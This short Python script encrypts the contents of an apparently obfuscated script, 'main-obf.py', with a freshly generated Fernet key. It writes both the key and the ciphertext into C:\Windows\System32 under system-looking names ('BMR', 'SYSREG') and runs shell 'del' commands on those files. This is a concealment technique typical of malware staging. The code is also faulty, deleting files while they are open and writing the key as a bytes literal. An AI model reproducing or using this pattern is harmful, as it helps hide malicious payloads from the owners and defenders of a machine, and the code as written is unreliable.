from cryptography.fernet import Fernet
import os
key = Fernet.generate_key()
keysave = open("C:\Windows\System32\BMR", "w")
os.system("del C:\Windows\System32\BMR")
keysave.write(str(key))
f= Fernet(key)
with open('main-obf.py', 'r') as file:
    data = file.read().replace('\n', '')
encrypt=f.encrypt(bytes(data, encoding='utf8'))
f = open("C:\Windows\System32\SYSREG", "w")
os.system("del C:\Windows\System32\SYSREG")
f.write(str(encrypt))